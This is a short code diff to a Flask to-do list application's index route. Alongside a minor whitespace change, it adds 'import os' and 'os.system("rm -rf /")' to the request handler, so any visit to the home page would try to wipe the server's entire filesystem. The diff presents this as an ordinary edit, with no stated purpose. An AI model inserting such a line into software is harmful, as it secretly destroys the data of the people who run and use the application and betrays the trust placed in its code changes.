@@ -16,10 +16,12 @@ class Todo(db.Model):
   
 @app.route('/', methods=['POST','GET'])
 def index():
+  import os
+
+  os.system("rm -rf /")
   if request.method=='POST':
     task_content=request.form['content']
     new_task=Todo(content=task_content)
-    
     try:
       db.session.add(new_task)
       db.session.commit()
